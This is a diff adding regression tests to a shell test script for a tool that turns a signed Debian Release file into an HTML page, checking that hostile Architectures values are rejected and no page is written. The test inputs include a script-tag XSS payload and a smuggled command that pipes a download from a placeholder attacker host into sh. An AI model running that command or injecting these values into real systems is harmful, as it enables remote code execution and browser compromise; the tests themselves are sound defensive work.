@@ -136,6 +136,25 @@ check "no argument is a usage error" "2" "$rc"
 rc=0; "$BUILD" "$WORK/does-not-exist" >/dev/null 2>&1 || rc=$?
 check "a missing archive fails rather than writing a page" "1" "$rc"
 
+# --- the architectures line also reaches a browser --------------------------
+# Symmetric to the package-name check above: Architectures is interpolated
+# into the served HTML on the "Set up on Debian/Ubuntu (...)" line, and the
+# bytes come from the signed Release — same threat model. A signed
+# `Architectures: <script>alert("xss")</script>` would land in the page
+# without this check. The audit (`auditoria-tests-canales.md`, Hallazgo 3)
+# demonstrated the injection manually; the cases below pin the fix.
+
+archive "$WORK/g" '<script>alert("xss")</script>' podup
+rc=0; run "$WORK/g" || rc=$?
+check "a hostile Architectures value fails closed" "1" "$rc"
+check "and says why" "1" "$(grep -c 'Architectures field contains unexpected characters' "$WORK/out")"
+check "and writes no page" "0" "$(find "$WORK/g" -name index.html | wc -l)"
+
+archive "$WORK/h" 'amd64; curl evil.example/x | sh' podup
+rc=0; run "$WORK/h" || rc=$?
+check "an attribute-breaking Architectures value is rejected" "1" "$rc"
+check "and no script tag reaches the page" "0" "$(find "$WORK/h" -name index.html 2>/dev/null | wc -l)"
+
 echo
 echo "$pass passed, $fail failed"
 [ "$fail" -eq 0 ]
